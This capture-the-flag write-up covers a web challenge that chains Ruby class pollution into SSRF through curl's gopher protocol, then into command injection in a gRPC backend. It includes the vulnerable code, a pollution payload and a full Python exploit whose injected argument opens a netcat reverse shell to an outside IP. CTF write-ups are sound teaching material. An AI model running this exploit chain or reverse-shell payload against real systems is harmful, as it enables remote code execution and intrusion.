# Eldoria Realms
Tags: #ruby #class-pollution #ssrf #gopher #grpc #http2 #command-injection 
## TLDR
ruby class pollution -> SSRF -> Command Injection -> RCE
## Description
> A portal that allows players of Eldoria to transport between realms, take on quests, and manage their stats. See if it's possible to break out of the realm to gather more info on Malakar's spells inner workings.
## Overview
There are 2 services: an api made with **ruby**, and a **grpc** backend.
## Road to flag
The flag is in `/flag.txt` -> RCE
## Code review
#### Frontend API
- `/connect-realms` and makes a request using **curl** to `realm_url`
```ruby
get "/connect-realm" do
		content_type :json
		if Adventurer.respond_to?(:realm_url)
			realm_url = Adventurer.realm_url
			begin
				uri = URI.parse(realm_url)
				stdout, stderr, status = Open3.capture3("curl", "-o", "/dev/null", "-w", "%{http_code}", uri)
				{ status: "HTTP request made", realm_url: realm_url, response_body: stdout }.to_json
			rescue URI::InvalidURIError => e
				{ status: "Invalid URL: #{e.message}", realm_url: realm_url }.to_json
			end
		else
			{ status: "Failed to access realm URL" }.to_json
		end
	end
```

`realm_uri` is hardcoded into `Adventurer`
```ruby
class Adventurer
	@@realm_url = "http://eldoria-realm.htb"

	attr_accessor :name, :age, :attributes

	def self.realm_url
		@@realm_url
	end
[ . . . ]
```

- Ruby class pollution in `app.rb` `post "/merge-fates"` -> allows to override `realm_url` leading to **SSRF**
A `Player` object is merged with the json taken in input.
```ruby
post "/merge-fates" do
		content_type :json
		json_input = JSON.parse(request.body.read)
		random_attributes = {
			"class" => ["Warrior", "Mage", "Rogue", "Cleric"].sample,
			"guild" => ["The Unbound", "Order of the Phoenix", "The Fallen", "Guardians of the Realm"].sample,
			"location" => {
				"realm" => "Eldoria",
				"zone" => ["Twilight Fields", "Shadow Woods", "Crystal Caverns", "Flaming Peaks"].sample
			},
			"inventory" => []
		}

		$player = Player.new(
			name: "Valiant Hero",
			age: 21,
			attributes: random_attributes
		)

		$player.merge_with(json_input)
		{ 
			status: "Fates merged", 
			player: { 
				name: $player.name, 
				age: $player.age, 
				attributes: $player.attributes 
			} 
		}.to_json
	end
```

The merge function is vulnerable to class pollution -> https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html.
```ruby
def recursive_merge(original, additional, current_obj = original)
    additional.each do |key, value|
      if value.is_a?(Hash)
        if current_obj.respond_to?(key)
          next_obj = current_obj.public_send(key)
          recursive_merge(original, value, next_obj)
        else
          new_object = Object.new
          current_obj.instance_variable_set("@#{key}", new_object)
          current_obj.singleton_class.attr_accessor key
        end
      else
        current_obj.instance_variable_set("@#{key}", value)
        current_obj.singleton_class.attr_accessor key
      end
    end
```

`Player` class is derived from `Adventurer`


#### Backend API
- The backend API uses **GRPc**, and has a command injection in `/healthCheck`
```go 
package main

import (
	"app/pb"
	"context"
	"fmt"
	"log"
	"net"
	"os/exec"
	"time"
	"google.golang.org/grpc"
	"google.golang.org/grpc/reflection"
)

type server struct {
	pb.UnimplementedLiveDataServiceServer
	ip   string
	port string
}

[ . . .]

func healthCheck(ip string, port string) error {
	cmd := exec.Command("sh", "-c", "nc -zv "+ip+" "+port)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Health check failed: %v, output: %s", err, output)
		return fmt.Errorf("health check failed: %v", err)
	}

	log.Printf("Health check succeeded: output: %s", output)
	return nil
}
```

## Exploitation
1. SSRF
How can I make a valid curl request to the grpc backend?
- It's possible to send raw TCP requests using `curl` and the `gopher` protocol.
- GRPC uses HTTP2, so I have to build a valid packet that I can send with the `gopher` protocol.
  It's possible to build a raw HTTP2 request using [`hyperframe`](https://github.com/python-hyper/hyperframe/).

Note: this works because curl `7.70.0` is used.
   ```dockerfile
   RUN wget https://curl.haxx.se/download/curl-7.70.0.tar.gz && \
       tar xfz curl-7.70.0.tar.gz && \
       cd curl-7.70.0/ && \
       ./configure --with-ssl --enable-shared && \
       make -j16 && \
       make install && \
       ldconfig
   ```
   
2. Class pollution
I can override `realm_uri` by sending a request `POST /merge-fates` with this payload: `{"class": { "superclass": { "realm_url": f"gopher://localhost:50051/_{payload}"}}}`


Flag: `HTB{p0llut3_4nd_h1t_pr0toc0lz_w_4_sw1tch_4252fa6a48618f89a46262d3e1855ba2}`
## Full exploit
```python
from hyperframe.frame import HeadersFrame, DataFrame, SettingsFrame
from hpack import Encoder
import struct
from urllib.parse import quote
import live_data_pb2
import requests

def create_health_check_request(ip, port):
    request = live_data_pb2.HealthCheckRequest()
    request.ip = ip
    request.port = port
    return request.SerializeToString()

preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
request_payload = create_health_check_request(ip="127.0.0.1", port="$(nc -c sh 37.27.184.43 4444)")

# Add gRPC prefix to the payload (5 bytes)
grpc_payload = struct.pack(">BI", 0, len(request_payload)) + request_payload  # Compression flag + length
# Build HTTP/2 frames
stream_id = 1
encoder = Encoder()
# SETTINGS frame (required for handshake)
settings_frame = SettingsFrame(stream_id=0)
settings = settings_frame.serialize()
# HEADERS frame (with required pseudo-headers)
headers = [
    (":method", "POST"),
    (":path", "/live.LiveDataService/CheckHealth"),
    (":scheme", "http"),
    (":authority", "localhost:50051"),
    ("content-type", "application/grpc"),
    ("te", "trailers"),
]
headers_frame = HeadersFrame(stream_id=stream_id)
headers_frame.data = encoder.encode(headers)
headers_frame.flags.add("END_HEADERS")
headers = headers_frame.serialize()
# DATA frame (gRPC payload)
data_frame = DataFrame(stream_id=stream_id)
data_frame.data = grpc_payload
data_frame.flags.add("END_STREAM")
data = data_frame.serialize()

payload = quote(preface + settings + headers + data)

url = "http://94.237.50.164:49095/"

requests.post(url+"/merge-fates", json={"class": { "superclass": { "realm_url": f"gopher://localhost:50051/_{payload}"}}})

response = requests.get(url+"/connect-realm")
print(response.text)
```